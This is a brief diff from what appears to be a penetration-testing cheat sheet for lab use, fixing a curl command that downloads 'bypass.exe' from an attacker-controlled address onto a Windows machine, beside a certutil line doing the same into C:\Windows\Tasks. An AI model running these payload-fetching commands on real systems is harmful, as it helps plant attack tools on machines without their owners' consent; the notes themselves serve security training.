@@ -7,7 +7,7 @@ certutil -urlcache http://lhost/bypass.exe C:\Windows\Tasks\bypass.exe
 
 #### Curl 
 ```
-curl http://192.168.45.201/bypass.exe C:\Users\Offsec\bypass.exe
+curl http://192.168.45.201/bypass.exe -o C:\Users\Offsec\bypass.exe
 ```
 
 #### Bitsadmin 
